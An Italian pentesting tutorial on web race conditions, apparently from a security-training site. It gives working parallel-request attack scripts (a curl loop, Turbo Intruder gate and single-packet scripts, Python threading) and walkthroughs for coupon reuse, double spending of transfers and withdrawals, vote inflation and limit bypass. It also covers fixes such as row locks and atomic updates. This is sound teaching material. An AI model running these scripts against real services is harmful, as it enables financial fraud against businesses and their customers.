---
title: >-
  Race Condition Web: Double Spending, Coupon Abuse e Attacchi Con Request
  Parallele
slug: race-condition
description: >-
  Race Condition nelle web app: double spending, coupon abuse e bypass dei
  limiti con request parallele. Tecniche di detection con Turbo Intruder e
  exploit reali.
image: /race-condition.webp
draft: false
date: 2026-03-18T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - race-condition
  - business-logic
---

# Cos'è Una Race Condition?

Una **Race Condition** nel web si verifica quando due o più request concorrenti accedono allo stesso stato prima che una di esse lo aggiorni. Il server controlla "il coupon è già usato?" → risponde "no" a entrambe le request (arrivate nello stesso istante) → entrambe lo applicano. Il coupon monouso viene usato due volte.

Non è un bug di codice classico — la logica è corretta per una request alla volta. Il problema è che il server non protegge l'accesso concorrente allo stato condiviso (database row, variabile, saldo). Nel web, dove le request arrivano in parallelo, questo ha impatto finanziario diretto: doppi pagamenti, doppi prelievi, doppi bonus, bypass di qualsiasi limite "una volta sola".

Satellite della [guida pillar Misc & Infra Attacks](https://hackita.it/articoli/misc-infra-attacks-guida-completa). Vedi anche: [Business Logic Flaw](https://hackita.it/articoli/business-logic-flaw), [API Rate Limit Bypass](https://hackita.it/articoli/api-rate-limit-bypass).

Riferimenti: [PortSwigger Race Conditions](https://portswigger.net/web-security/race-conditions), [James Kettle — Smashing the State Machine](https://portswigger.net/research/smashing-the-state-machine), [HackTricks Race Condition](https://book.hacktricks.wiki/en/pentesting-web/race-condition.html).

***

## Detection

### Step 1: Identifica Endpoint Vulnerabili

```bash
# Ogni operazione con vincolo "una volta sola" o "limite numerico":

# Coupon / Codici sconto monouso:
POST /api/cart/apply-coupon {"code": "SCONTO50"}

# Trasferimenti / Pagamenti (saldo limitato):
POST /api/transfers {"to": "IBAN", "amount": 500}

# Like / Voti (uno per utente):
POST /api/posts/123/like

# Riscatto reward / Punti:
POST /api/rewards/redeem {"reward_id": 42}

# Bonus referral (uno per invitato):
POST /api/referral/claim {"code": "FRIEND123"}

# Registrazione username (univoco):
POST /api/register {"username": "admin"}

# Prelievo crypto / withdraw:
POST /api/withdraw {"amount": "1000", "address": "0x..."}
```

### Step 2: Test Con Request Parallele (curl)

```bash
# Invia 20 request identiche in parallelo:
for i in $(seq 1 20); do
  curl -s -X POST "https://target.com/api/cart/apply-coupon" \
    -H "Cookie: session=abc123" \
    -H "Content-Type: application/json" \
    -d '{"code":"SCONTO50"}' \
    -o "/tmp/race_$i.json" &
done
wait

# Conta quante hanno avuto successo:
grep -l "discount" /tmp/race_*.json | wc -l
# Se > 1 → RACE CONDITION CONFERMATA!
# Controlla anche il carrello:
curl -s "https://target.com/api/cart" -H "Cookie: session=abc123" | python3 -m json.tool
# Se lo sconto è applicato più volte → confermato
```

### Step 3: Turbo Intruder (Preciso)

```python
# In Burp: click destro sulla request → Extensions → Turbo Intruder

# Script "race condition":
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,
                           requestsPerConnection=1,
                           pipeline=False)
    for i in range(20):
        engine.queue(target.req, gate='race1')
    
    # Apri il gate: TUTTE le request partono nello stesso istante
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### Step 4: Single-Packet Attack (Massima Precisione)

La tecnica di James Kettle: tutte le request in un **singolo pacchetto TCP** — il server le riceve nello stesso istante senza latenza di rete tra l'una e l'altra:

```python
# Turbo Intruder con pipeline (single TCP connection):
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=20,
                           pipeline=True)
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')
```

### Step 5: Python Threading (Alternativa)

```python
#!/usr/bin/env python3
import threading, requests

URL = "https://target.com/api/cart/apply-coupon"
COOKIES = {"session": "abc123"}
results = []

def try_coupon():
    r = requests.post(URL, json={"code":"SCONTO50"}, cookies=COOKIES, timeout=5)
    results.append(r.status_code)
    if r.status_code == 200:
        print(f"[+] Applied! Response: {r.text[:100]}")

threads = [threading.Thread(target=try_coupon) for _ in range(30)]
for t in threads: t.start()
for t in threads: t.join()

success = results.count(200)
print(f"\n[*] Success: {success}/30")
# Se success > 1 → race condition
```

***

## Exploit Concreti

### Doppio Riscatto Coupon

```bash
# Coupon SCONTO50 vale 50€, usabile una volta.
# Carrello: 200€.
# 20 request parallele:

# Senza race condition:
#   1 → coupon applicato (150€)
#   19 → "Coupon già utilizzato"

# CON race condition:
#   4 → coupon applicato (200 - 50 - 50 - 50 - 50 = 0€!)
#   16 → "Coupon già utilizzato"
# Il flag "usato" viene scritto DOPO le prime 4 request
```

### Double Spending (Trasferimento Doppio)

```bash
# Saldo: 1.000€
# 10 request parallele: POST /api/transfer {"to":"IBAN","amount":1000}

# Tutte e 10 controllano: saldo >= 1000? → SÌ (non ancora decrementato)
# Tutte e 10 eseguono il trasferimento
# → 10.000€ trasferiti con saldo di 1.000€

# Stesso pattern per:
# - Prelievi crypto (withdraw)
# - Pagamenti con wallet interno
# - Riscatto gift card
```

### Like/Vote Inflation

```bash
# "Un like per utente per post"
# 50 request parallele → 50 like registrati prima del check di unicità
# Impatto: manipolazione ranking, recensioni false
```

### Bypass Limite Quantitativo

```bash
# "Massimo 1 account free per utente"
# 5 request parallele: POST /api/accounts/create {"plan":"free"}
# Tutte e 5 controllano "quanti account ha?" → "0"
# → 5 account free creati
```

***

## Output Reale

```bash
# Turbo Intruder → 20 request a /api/cart/apply-coupon:

# Status | Body
# 200    | {"discount": 50, "total": 150}
# 200    | {"discount": 50, "total": 100}
# 200    | {"discount": 50, "total": 50}
# 200    | {"discount": 50, "total": 0}
# 400    | {"error": "Coupon already used"}
# 400    | {"error": "Coupon already used"}
# ... (16 × 400)

# → Coupon applicato 4 VOLTE! Da 200€ a 0€ con un coupon da 50€.
```

***

## Workflow Operativo

**Step 1** → Identifica endpoint con vincoli "una volta sola" o limiti numerici

**Step 2** → Turbo Intruder con gate → 20+ request parallele

**Step 3** → Analizza response: quante con successo? Se >1 → race condition

**Step 4** → Testa single-packet attack se il parallelismo standard non basta

**Step 5** → Calcola impatto finanziario: coupon × N, trasferimento × N, bonus × N

***

## Caso Studio

**Settore:** E-commerce italiano, sistema coupon, 300.000 clienti.

L'endpoint `POST /api/cart/apply-coupon` faceva `SELECT used FROM coupons WHERE code='SCONTO50'` → se `used=false` → `UPDATE coupons SET used=true`. Tra SELECT e UPDATE: nessun lock, nessuna transazione atomica. Turbo Intruder con 20 request → coupon da 100€ applicato 6 volte su carrello da 800€ → totale: 200€ invece di 700€.

Stesso pattern sul referral: bonus 10€ per invito (max 1 per utente invitato) riscattato 3-4 volte con request parallele.

**Nessun lock tra check e update → 600€ di sconto da un coupon da 100€.**

***

## FAQ

### La race condition è riproducibile in modo affidabile?

Dipende. Con Turbo Intruder e single-packet attack, la window temporale è molto più ampia. Su server lenti o database non ottimizzati, è quasi sempre riproducibile. Su server veloci con connessioni pool ottimizzate, potresti dover aumentare il numero di request o ripetere il test più volte.

### È diversa dal TOCTOU?

TOCTOU (Time of Check to Time of Use) è il pattern sottostante: il tempo tra il check ("il coupon è usato?") e l'uso ("segna il coupon come usato") è la finestra vulnerabile. La race condition web è una TOCTOU sfruttata via request HTTP parallele.

### Come la previeni?

**Database locks**: `SELECT ... FOR UPDATE` (PostgreSQL, MySQL) blocca la riga durante la transazione. **Operazioni atomiche**: `UPDATE coupons SET used=true WHERE code='X' AND used=false` — un singolo statement che fa check e update insieme. **Idempotency keys**: ogni request ha un ID univoco, il server rifiuta duplicati.

### Funziona solo su endpoint di pagamento?

No. Funziona su qualsiasi endpoint con un vincolo "una volta": like, voti, registrazione username, riscatto reward, invito referral, creazione account, applicazione coupon, trasferimento fondi. Qualsiasi operazione che controlla uno stato e poi lo modifica in due step separati.

***

## ✅ Checklist

```
TARGET
☐ Coupon/sconto monouso → testato
☐ Trasferimenti/pagamenti → double spending testato
☐ Like/voti → inflazione testata
☐ Reward/punti riscatto → doppio riscatto testato
☐ Registrazione username univoco → duplicato testato
☐ Limiti "max 1 per utente" → bypass testato
☐ Prelievi/withdraw → double spending testato

DETECTION
☐ curl parallelo (20+ request con &) eseguito
☐ Turbo Intruder con gate configurato e testato
☐ Single-packet attack testato
☐ Python threading testato
☐ Response analizzate: quante con successo?

ANALISI
☐ Impatto finanziario calcolato (sconto×N, transfer×N)
☐ Pattern replicabile in modo affidabile?
☐ Window temporale stimata
```

***

> I tuoi coupon reggono a 20 request parallele? I trasferimenti hanno lock atomici? [Penetration test HackIta](https://hackita.it/servizi). Dalla race condition al danno finanziario: [formazione 1:1](https://hackita.it/formazione).
